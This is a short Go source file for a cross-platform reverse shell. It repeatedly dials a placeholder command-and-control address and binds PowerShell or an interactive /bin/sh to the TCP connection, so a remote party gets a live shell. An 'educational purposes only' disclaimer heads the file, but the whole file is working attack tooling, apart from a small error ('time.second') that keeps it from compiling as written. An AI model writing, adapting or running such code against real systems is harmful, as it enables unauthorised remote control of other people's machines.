package main

// Simmple basic universal reverse shell
// ** ONLY USE FOR EDUCATIONAL PURPOSES ONLY **
// ** ILLEGAL TO USE ON ANYTHING WITHOUT EXPRESS PERMISSION FROM OWNER **

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"time"
)

func main() {
	fmt.Println("Simple Go Rev Shell")
	for {
		time.Sleep(3 * time.second)
		sendShell()
	}
}

// send shell to remote server
func sendShell() {
	// c2 connection
	conn, err := net.Dial("tcp", "<$IP>:<$PORT>")
	if err != nil {
		return
	}

	// os spec shell
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	// send stdin/out,err to c2
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
